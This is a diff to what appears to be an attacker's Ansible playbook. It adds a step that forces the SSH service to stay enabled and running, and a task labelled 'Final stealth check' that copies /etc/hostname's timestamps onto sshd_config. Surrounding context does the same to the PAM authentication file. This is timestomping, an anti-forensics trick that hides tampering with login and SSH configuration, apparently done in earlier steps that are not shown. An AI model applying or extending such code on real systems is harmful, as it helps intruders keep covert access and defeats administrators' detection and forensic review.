@@ -56,3 +56,18 @@
   become: yes
   shell: "touch -r /etc/hostname /etc/pam.d/common-auth && touch -r /etc/hostname /etc/ssh/sshd_config"
   ignore_errors: yes
+
+# --- STEP 6: FINAL SERVICE ENFORCEMENT ---
+- name: Ensure SSH service is fully operational and persistent
+  become: yes
+  systemd:
+    name: ssh
+    enabled: yes
+    state: started
+    masked: no
+  ignore_errors: yes
+
+- name: Final stealth check - Syncing timestamps again
+  become: yes
+  shell: "touch -r /etc/hostname /etc/ssh/sshd_config"
+  ignore_errors: yes
